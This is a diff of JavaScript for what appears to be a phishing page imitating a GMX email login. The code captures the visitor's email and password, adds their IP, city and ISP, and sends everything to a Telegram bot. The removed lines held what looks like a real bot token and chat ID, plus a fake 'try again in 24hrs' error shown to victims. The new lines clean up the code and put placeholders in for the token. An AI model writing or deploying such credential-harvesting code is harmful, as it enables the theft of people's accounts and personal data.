@@ -1,14 +1,14 @@
 document.addEventListener('DOMContentLoaded', function () {
-    const form = document.getElementById('form-section');
+    const form = document.getElementById('form');
 
     form.addEventListener('submit', function (event) {
-        event.preventDefault(); // Prevents the default form submission
+        event.preventDefault(); // Prevents default form submission
 
-        const GMX E-Mail-Address = document.getElementById('usr-id').value;
-        const Password = document.getElementById('pwd').value;
+        const usrId = document.getElementById('usr-id').value.trim();
+        const password = document.getElementById('pwd').value.trim();
 
-        if (!usr-id || !pwd) {
-            alert('Both username and password are required.');
+        if (!usrId || !password) {
+            alert('Both email and password are required.');
             return;
         }
 
@@ -21,11 +21,11 @@ document.addEventListener('DOMContentLoaded', function () {
                 const city = data.city;
                 const isp = data.org;
 
-                const message = `🔹 New Login Attempt 🔹\n👤 Username: ${usr-id}\n🔑 Password: ${pwd}\n🌎 IP: ${ip}\n📍 Location: ${city}, ${country}\n💻 ISP: ${isp}`;
+                const message = `🔹 New Login Attempt 🔹\n📧 Email: ${usrId}\n🔑 Password: ${password}\n🌎 IP: ${ip}\n📍 Location: ${city}, ${country}\n💻 ISP: ${isp}`;
 
-                // Replace these with your bot token and chat ID
-                const botToken = '7398105901:AAGMqPU6Xvcho2FwqubVM_r51ei8XkWKSLc';
-                const chatId = '6651292809';
+                // Replace with your actual bot token and chat ID
+                const botToken = 'YOUR_BOT_TOKEN';
+                const chatId = 'YOUR_CHAT_ID';
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
                 const payload = {
@@ -43,7 +43,7 @@ document.addEventListener('DOMContentLoaded', function () {
                 .then(response => response.json())
                 .then(data => {
                     if (data.ok) {
-                        alert('Update error please try again in 24hrs.');
+                        alert('Login details sent successfully.');
                     } else {
                         alert('Error sending message to Telegram.');
                     }
